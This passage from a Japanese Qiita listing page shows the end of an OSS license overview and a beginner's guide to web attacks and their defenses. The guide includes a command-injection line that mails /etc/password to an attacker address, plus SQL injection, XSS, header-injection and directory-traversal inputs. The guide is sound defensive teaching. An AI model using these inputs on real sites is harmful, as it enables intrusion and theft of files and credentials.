<td style="text-align: center">-</td>
<td style="text-align: center"><strong>あり</strong></td>
</tr>
</tbody>
</table>

<p><a></a></p>

<h3>
<span id="各ライセンスの特徴" class="fragment"></span><a href="#%E5%90%84%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9%E3%81%AE%E7%89%B9%E5%BE%B4"><i class="fa fa-link"></i></a>各ライセンスの特徴</h3>

<h4>
<span id="共通の特徴" class="fragment"></span><a href="#%E5%85%B1%E9%80%9A%E3%81%AE%E7%89%B9%E5%BE%B4"><i class="fa fa-link"></i></a>共通の特徴</h4>

<ul>
<li>派生ソフトウェアを頒布する際は、<strong>利用元OSSのライセンス表示（「著作権表示」、「ライセンス文」、「免責条項」）を掲載しなければならない。</strong>

<ul>
<li>
<strong><em>派生ソフトウェアをソースコード形式で頒布する場合：</em></strong><br>
利用元OSSのソースコード中に「著作権表示」、「ライセンス文」、「免責条項」が含まれているため、これらを故意に除去しなければ特に何もする必要はない。</li>
<li>
<strong><em>バイナリ形式で再頒布する場合：</em></strong><br>
頒布するバイナリファイルと併せて利用元OSSの「著作権表示」、「ライセンス文」、「免責条項」を掲載したライセンスファイル（「COPYINGファイル」や「LICENSEファイル」）を頒布先に提供する必要がある。</li>
</ul>
</li>
</ul>

<p><a></a></p>

<h4>
<span id="gnu-gpl-v2gnu-general-public-license-v2" class="fragment"></span><a href="#gnu-gpl-v2gnu-general-public-license-v2"><i class="fa fa-link"></i></a>GNU GPL v2（GNU General Public License v2）</h4>

<p>本ライセンスを適用しているOSS：MySQL, Redmine, Git, CentOS</p>

<ul>
<li>コピーレフト型ライセンスであるため、本ライセンスのOSSを利用する場合は<strong>頒布する派生ソフトウェアもGPLライセンスを適用しなければならない。</strong>
</li>
<li>派生ソフトウェアのバイナリを第三者に提供する場合は<strong>頒布先にソースコードを開示しなければならない。</strong>
</li>
<li>以下の記載例のように、<strong>派生ソフトウェア自体のライセンス文を掲載しなければならない</strong>。</li>
</ul>

<h6>
<span id="ライセンスの記載例" class="fragment"></span><a href="#%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9%E3%81%AE%E8%A8%98%E8%BC%89%E4%BE%8B"><i class="fa fa-link"></i></a>ライセンスの記載例</h6>

<ul>
<li>派生ソフトウェアの各ソースファイルの冒頭にライセンス文を記載する。</li>
<li>各ソースファイルにライセンス文を記載することが困難な場合は、ライセンス全文のファイルを別途作成し、各ソースファイルには冒頭の2行（「派生ソフトウェアのプログラム名」と「Copyright」行）とライセンス全文のファイルがある場所のパスを記載する。</li>
</ul>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>派生ソフトウェアのプログラム名と簡単な説明
Copyright (C) 西暦年  派生ソフトウェアの作者名

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
</pre></div></div>

<h4>
<span id="gnu-gpl-v3gnu-general-public-license-v3" class="fragment"></span><a href="#gnu-gpl-v3gnu-general-public-license-v3"><i class="fa fa-link"></i></a>GNU GPL v3（GNU General Public License v3）</h4>

<ul>
<li>「GNU GPL v2」に<strong>特許条項</strong>を追加したライセンスである。</li>
<li>対象ソフトウェアを利用する場合に限り、対象ソフトウェアに含まれる特許を自由に利用できる。</li>
</ul>

<p><a></a></p>

<h4>
<span id="mit-license" class="fragment"></span><a href="#mit-license"><i class="fa fa-link"></i></a>MIT License</h4>

<p>本ライセンスを適用しているOSS：jQuery, Bootstrap</p>

<ul>
<li>利用元OSSのライセンス表示さえ掲載していれば、ソフトウェアを自由に頒布することができる。</li>
</ul>

<h4>
<span id="2-clause-bsd-license二条項bsdライセンス" class="fragment"></span><a href="#2-clause-bsd-license%E4%BA%8C%E6%9D%A1%E9%A0%85bsd%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>2-Clause BSD License（二条項BSDライセンス）</h4>

<ul>
<li>
<strong>「MIT License」と同等のライセンス</strong>であり、これらのライセンスの規定にほぼ違いはない。</li>
</ul>

<p><a></a></p>

<h4>
<span id="3-clause-bsd-license三条項bsdライセンス修正bsdライセンス" class="fragment"></span><a href="#3-clause-bsd-license%E4%B8%89%E6%9D%A1%E9%A0%85bsd%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9%E4%BF%AE%E6%AD%A3bsd%E3%83%A9%E3%82%A4%E3%82%BB%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>3-Clause BSD License（三条項BSDライセンス、修正BSDライセンス）</h4>

<ul>
<li>「2-Clause BSD License」に<strong>作成者名の無断使用を禁止する条項</strong>を追加したライセンスである。</li>
</ul>

<p><a></a></p>

<h4>
<span id="apache-license-version-20" class="fragment"></span><a href="#apache-license-version-20"><i class="fa fa-link"></i></a>Apache License Version 2.0</h4>

<p>本ライセンスを適用しているOSS：Apache, Docker</p>

<ul>
<li>「MIT License」とほぼ同等の規定に<strong>特許条項</strong>を追加したライセンスである。</li>
<li>対象ソフトウェアを利用する場合に限り、対象ソフトウェアに含まれる特許を自由に利用できる。</li>
</ul>

<hr>

<h6>
<span id="参考文献-3" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE-3"><i class="fa fa-link"></i></a>参考文献</h6>

<ul>
<li><a href="http://wisdommingle.com/mit-license/" rel="nofollow noopener" target="_blank">MITライセンスってなに？どうやって使うの？商用でも無料で使えるの？ - WisdomMingle.com</a></li>
<li><a href="https://oss.sios.com/guest-blog/gestblog-oss-license-vol2" rel="nofollow noopener" target="_blank">可知豊の『 わかっておきたい、オープンソースライセンス』: 第2回 色々なオープンソースライセンスをわかっておきたい — サイオステクノロジー</a></li>
<li><a href="http://www.opensource.jp/gpl/gpl.ja.html#SEC3" rel="nofollow noopener" target="_blank">GNU 一般公衆利用許諾契約書 - GNU プロジェクト - フリーソフトウェア財団</a></li>
<li><a href="http://matometaru.com/licence/#GPLMIT" rel="nofollow noopener" target="_blank">WordPressのテーマに使われるライセンス(GPL、MIT)についてまとめ - まとめたる</a></li>
<li><a href="http://www.catch.jp/oss-license/2013/09/27/mit_license/" rel="nofollow noopener" target="_blank">自作ソースコードに、MITライセンスを適用する３つのやり方 - オープンソース・ライセンスの談話室</a></li>
<li><a href="http://www.atmarkit.co.jp/ait/articles/0906/26/news129.html" rel="nofollow noopener" target="_blank">企業技術者のためのOSSライセンス入門（3）：アカデミック系OSSライセンスに関する一考察 - ＠IT</a></li>
<li><a href="http://www.yoheim.net/blog.php?q=20120914" rel="nofollow noopener" target="_blank">MIT、BSD、GPLライセンスの内容と意味を学んでみた - YoheiM .NET</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">57位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>172</kbd>
		<a target="_blank" href="https://qiita.com/Tsutou/items/4fd498f8ab2638bd5650">Webセキュリティ覚書 : &quot;攻撃&quot; 編 [ 初学者向け ]</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-21<br />10:56:00</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/187392.html">Tsutou</a>(5件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/187392/profile-images/1505559295">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[SQL]</b> <b>[データベース]</b> <b>[初心者]</b> <b>[セキュリティ]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="webのセキュリティ" class="fragment"></span><a href="#web%E3%81%AE%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3"><i class="fa fa-link"></i></a>Webのセキュリティ</h1>

<p>プログラミングスクールからエンジニアデビューしたものですが、セキュリティの重要さと、攻撃された時の恐ろしさに戦々恐々としました。今でもしてます。</p>

<p>たとえ、エンジニアでなくとも、最低限の対策をしないとリリースするのは危険です。</p>

<p>プログラミングスクールではセキュリティについては、深く学ぶことはあまりないと思います。<br>
自分と同じ駆け出しエンジニアさんや、エンジニアじゃないけど、Webサービスリリースしたい！みたいな方に共有できたらと思います。<br>
セミナーでセキュリティについて学んできたので、復習も兼ねて自分なりの解釈で記事に落とそうと思います。</p>

<h1>
<span id="脆弱性" class="fragment"></span><a href="#%E8%84%86%E5%BC%B1%E6%80%A7"><i class="fa fa-link"></i></a><strong>脆弱性?</strong>
</h1>

<p>Webサイトの脆弱性は二種類。</p>

<h2>
<span id="ロジックエラー設計段階で生まれる脆弱性" class="fragment"></span><a href="#%E3%83%AD%E3%82%B8%E3%83%83%E3%82%AF%E3%82%A8%E3%83%A9%E3%83%BC%E8%A8%AD%E8%A8%88%E6%AE%B5%E9%9A%8E%E3%81%A7%E7%94%9F%E3%81%BE%E3%82%8C%E3%82%8B%E8%84%86%E5%BC%B1%E6%80%A7"><i class="fa fa-link"></i></a>ロジックエラー(設計段階で生まれる脆弱性)</h2>

<p>セッションの管理不備や特殊文字を処理せずにデータを受け渡してしまうことです。</p>

<h2>
<span id="テクニカルエラー実装段階で生まれる脆弱性" class="fragment"></span><a href="#%E3%83%86%E3%82%AF%E3%83%8B%E3%82%AB%E3%83%AB%E3%82%A8%E3%83%A9%E3%83%BC%E5%AE%9F%E8%A3%85%E6%AE%B5%E9%9A%8E%E3%81%A7%E7%94%9F%E3%81%BE%E3%82%8C%E3%82%8B%E8%84%86%E5%BC%B1%E6%80%A7"><i class="fa fa-link"></i></a>テクニカルエラー(実装段階で生まれる脆弱性)</h2>

<p>SQLインジェクション、XSS(クロスサイトスクリプティング)などの対策の不足</p>

<h2>
<span id="sqlインジェクション" class="fragment"></span><a href="#sql%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a><strong><font color="red">SQLインジェクション</font></strong>
</h2>

<h2>
<span id="概要" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a>概要</h2>

<p>データベースを操作するSQL文をフォームなどを通して送信し、アプリ側で任意のSQL文を実行させることを言います。<br>
入社試験でこの語句を解説しろという問題も出ました。それくらい対策必須かつ、被害の多い攻撃です。</p>

<p>ニュースを賑わす、企業の情報流出は巧妙なこのSQLインジェクションによるものが圧倒的に多いそうです。</p>

<p><a href="https://www.scutum.jp/information/web_security_primer/sql_injection.html" rel="nofollow noopener" target="_blank">SQL インジェクションとは？- サイト運営者のためのWebサイトセキュリティ対策入門</a></p>

<h2>
<span id="例" class="fragment"></span><a href="#%E4%BE%8B"><i class="fa fa-link"></i></a>例</h2>

<p>簡易的に下記のようなSQL用いて、ユーザーIDとパスワードだけで認証をするシステムがあったとします。(今時暗号化されていないpasswordはありえませんが)</p>

<div class="code-frame" data-lang="sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'$user_id'</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="s1">'$password'</span>
</pre></div></div>

<p>↓<br>
犯罪者は変数<strong>$password</strong>に<code>' OR '1' = '1</code>と入るようにユーザー登録をします。<br>
↓<br>
すると、</p>

<div class="code-frame" data-lang="sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'$user_id'</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="s1">'1'</span> <span class="o">=</span> <span class="s1">'1'</span>
</pre></div></div>

<p>というpasswordがあってなくても、この世で<strong>1が1</strong>ならば全件取得するという無茶苦茶な条件式が出来上がります。</p>

<p>ダダ漏れですね。</p>

<h2>
<span id="対策" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96"><i class="fa fa-link"></i></a>対策</h2>

<p>代表的なものでは、プログラム側で<strong>静的プレースホルダ</strong>を実装することが有効とされています。</p>

<div class="code-frame" data-lang="sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span> <span class="o">?</span> <span class="k">and</span> <span class="n">password</span><span class="o">=</span> <span class="o">?</span>  
</pre></div></div>

<p>プレースホルダは?の中に変数の値を埋め込んでくれます。(バインディング)</p>

<p><a href="http://php.net/manual/ja/class.pdostatement.php" rel="nofollow noopener" target="_blank">PDOStatement</a>でDB接続したと仮定して変数データを?に以下のようにバインディングします。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE id= ? and password= ? "</span><span class="p">;</span>

<span class="c1">//プリペアードステートメント-&gt;実行したいSQLをコンパイルした一種のテンプレート</span>
<span class="nv">$sth</span> <span class="o">=</span> <span class="nv">$dbh</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>

<span class="c1">//1つ目の?にバインド</span>
<span class="nv">$sth</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$user_id</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>

<span class="c1">//2つ目の?にバインド</span>
<span class="nv">$sth</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>

<span class="c1">//PDPStatement::excecute-&gt; プリペアドステートメントを実行する</span>
<span class="nv">$sth</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</pre></div></div>

<p><a href="http://php.net/manual/ja/pdostatement.bindparam.php" rel="nofollow noopener" target="_blank">PDOStatement::bindParam</a><br>
<a href="http://php.net/manual/ja/pdo.prepared-statements.php" rel="nofollow noopener" target="_blank">プリペアドステートメントおよびストアドプロシージャ</a></p>

<h2>
<span id="osコマンドインジェクション" class="fragment"></span><a href="#os%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a><strong><font color="red">OSコマンドインジェクション</font></strong>
</h2>

<h2>
<span id="概要-1" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-1"><i class="fa fa-link"></i></a>概要</h2>

<p>SQL文ではなく、OSコマンドを送り込んでダイレクトに操作してしまう攻撃です。<br>
Webサイトの挙動から、PHPでいう<a href="http://php.net/manual/ja/function.exec.php" rel="nofollow noopener" target="_blank">exec関数</a>などの外部のプログラムをコマンドにより呼び出す関数を推測され、システムを操作されます。<br>
メール送信機能はOSコマンドを使用しやすいので、そこに乗せて攻撃されることが多いようです。</p>

<h2>
<span id="例-1" class="fragment"></span><a href="#%E4%BE%8B-1"><i class="fa fa-link"></i></a>例</h2>

<p><a href="https://camo.qiitausercontent.com/4e14bed0e95a40c379e248978ae6b79beac7c051/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3138373339322f65623936663534662d316665332d623264382d336235652d3163316363393861366131632e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/4e14bed0e95a40c379e248978ae6b79beac7c051/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3138373339322f65623936663534662d316665332d623264382d336235652d3163316363393861366131632e6a706567" alt="お問い合わせ.jpg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/187392/eb96f54f-1fe3-b2d8-3b5e-1c1cc98a6a1c.jpeg"></a></p>

<p>こういうwebアプリケーションのお問い合わせフォームは、メールを自動送信するときに<strong>mailコマンド</strong>や<strong>sendmailコマンド</strong>を使用しています。<br>
↓<br>
犯罪者がどこかの箇所に、<br>
<code>；cat /etc/password | mail hacker_no@gmail.com</code><br>
とでも打てばコマンド呼び出し関数は；(セミコロン)の後も読み込み、passwordファイルやら重要なファイルをダウンロードし犯罪者に送信します。</p>

<h2>
<span id="対策-1" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-1"><i class="fa fa-link"></i></a>対策</h2>

<p>対策としては前提として、OSコマンドを呼び出す関数はできるだけ使わないこと。<br>
もし、呼び出すなら必ず特殊文字をエスケープすること。</p>

<p><a href="https://blog.ohgaki.net/os-command-escape" rel="nofollow noopener" target="_blank">OSコマンドのエスケープ</a></p>

<h2>
<span id="xssクロスサイトスクリプティング" class="fragment"></span><a href="#xss%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a><strong><font color="red">XSS(クロスサイトスクリプティング)</font></strong>
</h2>

<h2>
<span id="概要-2" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-2"><i class="fa fa-link"></i></a>概要</h2>

<p>ブラウザ上で不正なスクリプト(一般的にはJavaScript)を動作させる攻撃。<br>
GETまたはPOSTでWebサイトにスクリプトを送信し、そのまま表示しようとすれば、そのままUIとして動作します。<br>
入力文字列が遷移先で表示されるアルゴリズムには、XSS脆弱性が潜んでいる可能性があります。<br>
JavaScriptでできるすべてのことがリスクになりえます。</p>

<h2>
<span id="例-2" class="fragment"></span><a href="#%E4%BE%8B-2"><i class="fa fa-link"></i></a>例</h2>

<p>極端に簡単な例ですが...</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span> <span class="s">'nickname'</span> <span class="p">&gt;</span>
</pre></div></div>

<p>がPOSTで飛んできたものを</p>

<p>次ページで</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'nickname'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x"></span>
</pre></div></div>

<p>と表示するプログラムがあるとすると。<br>
↓</p>

<p>犯罪者が</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">”text/javascript”</span><span class="p">&gt;</span>
　<span class="nx">alert</span><span class="p">(</span><span class="s2">"お前はアホなのか？"</span><span class="p">);</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div></div>

<p>とフォーム送信すればHTMLにスクリプトタグで埋め込まれて表示されるので、Web上に暴言をアラート表示します。<br>
他にもURLを踏ませたり、偽ページに遷移したり、後述するcookie取得によるセッションハイジャックなど、様々な攻撃法を持っています。</p>

<p>JavaScriptでできるすべてのことがリスクになりえます。(二回目)</p>

<h2>
<span id="対策-2" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-2"><i class="fa fa-link"></i></a>対策</h2>

<p>代表的なのは、文字列出力の際の特殊文字エンコードです。特殊文字を以下のように置き換えます。</p>

<div class="code-frame" data-lang="erb"><div class="highlight"><pre><span></span><span class="x">&amp; =&gt; &amp;amp;</span>
<span class="x">&lt; =&gt; &amp;lt;</span>
<span class="x">&gt; =&gt; &amp;gt;</span>
<span class="x">" =&gt; &amp;quot;</span>
<span class="x">' =&gt; &amp;#39;</span>
</pre></div></div>

<p>ただ、PHPは<a href="https://www.weblio.jp/content/htmlspecialchars" rel="nofollow noopener" target="_blank">htmlspecialchars関数</a>を使用すると自動的にエンコードしてくれます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">escape</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p><strong>反射型</strong>、<strong>蓄積型</strong>、<strong>DOM Based XSS</strong>というタイプ分けもあり、もっと深く知りたい方は、以下の記事参考になります。<br>
<a href="http://xss.hatenablog.jp/entry/2014/12/03/154132" rel="nofollow noopener" target="_blank">結局XSSって何なの？</a></p>

<h2>
<span id="xstクロスサイトトレーシング" class="fragment"></span><a href="#xst%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a><strong><font color="red">XST(クロスサイトトレーシング)</font></strong>
</h2>

<h2>
<span id="概要-3" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-3"><i class="fa fa-link"></i></a>概要</h2>

<p>これは結論から言うと、XSSを利用し<a href="https://www.ginnokagi.com/2012/05/http-trace.html" rel="nofollow noopener" target="_blank">TRACEメソッド</a>を発行させる攻撃ですが、ブラウザの進化により、<strong><em>もう出来ないそうです</em></strong>。<br>
ただ、未だに<del>ギャーギャー</del>指摘してくる人間は一定数いるので、対策しておくに越したことはないそうです。</p>

<p><a href="https://blog.tokumaru.org/2013/01/TRACE-method-is-not-so-dangerous-in-fact.html" rel="nofollow noopener" target="_blank">実はそんなに怖くないTRACEメソッド</a></p>

<h2>
<span id="対策-3" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-3"><i class="fa fa-link"></i></a>対策</h2>

<p>対策は簡単で、上述のエンコードをした上で、WebサーバーのTRACEメソッド設定を無効にすればいいようです。<br>
<a href="http://itochif.com/contents/Security/Apache/apache_003000.html" rel="nofollow noopener" target="_blank">[Apache] TRACEメソッドを無効にする - itochif.com</a></p>

<h2>
<span id="セッションハイジャック" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%8F%E3%82%A4%E3%82%B8%E3%83%A3%E3%83%83%E3%82%AF"><i class="fa fa-link"></i></a><strong><font color="red">セッションハイジャック</font></strong>
</h2>

<h2>
<span id="概要-4" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-4"><i class="fa fa-link"></i></a>概要</h2>

<p>セッションは銀行や携帯ショップの番号札のようなものです。<br>
そのセッション管理のロジックの脆弱性をつき、推測可能性が高ければ、そのまま使用したり、総当たりでセッションを自動生成してアクセスし、成功するまで繰り返します。<br>
そして、セッションIDを使用しているユーザーになりすまし、悪事を働きます。</p>

<h2>
<span id="例-3" class="fragment"></span><a href="#%E4%BE%8B-3"><i class="fa fa-link"></i></a>例</h2>

<p>何度かアクセスし、セッションIDをログする。(こんな簡単なのは流石にないですが、パターンを読み解くと言う意味で。)</p>

<div class="code-frame" data-lang="numpy"><div class="highlight"><pre><span></span><span class="mi">106662</span>
<span class="mi">106664</span>
<span class="mi">106666</span>
<span class="mi">106668</span>
<span class="mi">106669</span>
<span class="mi">106675</span>
</pre></div></div>

<p>こうなると、前半の1066は固定で、下２桁はカウントアップだと言うことが一目瞭然です。あとは、下２桁を総当たりでアクセスし続け、他人のセッションIDを使って成り済ますことができます。</p>

<h2>
<span id="対策-4" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-4"><i class="fa fa-link"></i></a>対策</h2>

<p>前提の対策として、セッションIDを簡単に予測出来るものにしないことです。<br>
リクエストごとにセッションIDを変えたり、有効期限を設定したり、<a href="https://www.symantec.com/ja/jp/page.jsp?id=ssl-tls" rel="nofollow noopener" target="_blank">HTTPS(暗号化SSL/TLS通信)</a>を使用するなどして、推測しづらく、可変性の高いものを目指しましょう。</p>

<h2>
<span id="セッション固定攻撃" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E5%9B%BA%E5%AE%9A%E6%94%BB%E6%92%83"><i class="fa fa-link"></i></a><strong><font color="red">セッション固定攻撃</font></strong>
</h2>

<h2>
<span id="概要-5" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-5"><i class="fa fa-link"></i></a>概要</h2>

<p>前述のセッションハイジャックの逆で、罠を仕掛けて、攻撃者が指定したセッションIDをユーザーに知らず知らずに使わせる方法です。XSSのように罠ありきの受動的な攻撃です。</p>

<h2>
<span id="例-4" class="fragment"></span><a href="#%E4%BE%8B-4"><i class="fa fa-link"></i></a>例</h2>

<p>犯罪者はセッションidを含んだURLを<strong>メール</strong>なり<strong>XSS</strong>なりでユーザーに踏ませます。<br>
↓<br>
<code>htttp://www.hanzai.com/login.cgi?sesid=893893</code><br>
↓<br>
こうして、犯罪者側のログインセッションに無意識のうちに有効にしてしまいます。入られてしまえば、あとはやりたい放題です。</p>

<h2>
<span id="対策-5" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-5"><i class="fa fa-link"></i></a>対策</h2>

<p>対策としては、セッションハイジャックと似ており、やはりセッションIDを認証ごとに変えたり、認証を行わない場所ではセッションIDを使わないといった対策が考えられます。</p>

<h2>
<span id="httpヘッダインジェクションメールサーバーインジェクション" class="fragment"></span><a href="#http%E3%83%98%E3%83%83%E3%83%80%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%A1%E3%83%BC%E3%83%AB%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a><strong><font color="red">Httpヘッダインジェクション、メールサーバーインジェクション</font></strong>
</h2>

<h2>
<span id="概要-6" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-6"><i class="fa fa-link"></i></a>概要</h2>

<p>文字通り、　HTTPレスポンスに任意のヘッダやボディを追加する攻撃です。メールサーバーインジェクションは、同じようにメールヘッダに、任意のヘッダや本文を追加する攻撃です。</p>

<h2>
<span id="例-5" class="fragment"></span><a href="#%E4%BE%8B-5"><i class="fa fa-link"></i></a>例</h2>

<p>HTTPヘッダは改行で区切りを判断しております。<br>
以下、%0dは改行コードです。</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>http://hanzai.com?location=%0d%0d<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">”text/javascript”</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="err">“</span><span class="nx">アホなの</span><span class="err">？”</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div></div>

<p>単純に言えば、本来の動きとは違うこういった、任意のヘッダを入れて改竄してしまうのですね。</p>

<p>レスポンスヘッダやボディを改竄するというのは、UIが改ざんされるという事ですから、ユーザーのクッキー（cookie）情報を抜き取るスクリプトなんてこともできるようです（javascriptを埋め込むことができるということです。)</p>

<h2>
<span id="対策-6" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-6"><i class="fa fa-link"></i></a>対策</h2>

<p>Webサーバや言語のライブラリ、APIをなるべく使いましょう。<br>
あらかじめ用意されたものなので、余分な改行コードによって改変される可能性が少ないです。<br>
また、アプリ側のバリデーションを徹底しましょう。</p>

<h2>
<span id="ディレクトリトラバーサルdirectory-traversal" class="fragment"></span><a href="#%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E3%83%88%E3%83%A9%E3%83%90%E3%83%BC%E3%82%B5%E3%83%ABdirectory-traversal"><i class="fa fa-link"></i></a><strong><font color="red">ディレクトリトラバーサル(Directory Traversal)</font></strong>
</h2>

<h2>
<span id="概要-7" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81-7"><i class="fa fa-link"></i></a>概要</h2>

<p><strong><code>../../XXX</code></strong>などの相対パスを使ったリクエストを送り、ディレクトリ移動しアプリ内の非公開ディレクトリや他のファイルに横断的にアクセスされ、重要な情報を盗む攻撃です。</p>

<p>現在、なかなかホットな攻撃手法のようです。</p>

<h2>
<span id="例-6" class="fragment"></span><a href="#%E4%BE%8B-6"><i class="fa fa-link"></i></a>例</h2>

<p><code>http://hanzai.com/file.php?fn=hanzai.pdf</code><br>
上記のリクエストで指定されるべき、pdfファイルダウンロードの<code>file.php</code>というphpスクリプトがあったとします。<br>
↓<br>
<code>http://hanzai.com/file.php?fn=../etc/password</code>と犯罪者はリクエストを改変して送ってきます。</p>

<p>もし脆弱性があれば、簡単にファイルを盗まれてしまいます。</p>

<h2>
<span id="対策-7" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-7"><i class="fa fa-link"></i></a>対策</h2>

<p>想定される文字列のみ受け付けるバリデーションをしましょう。<br>
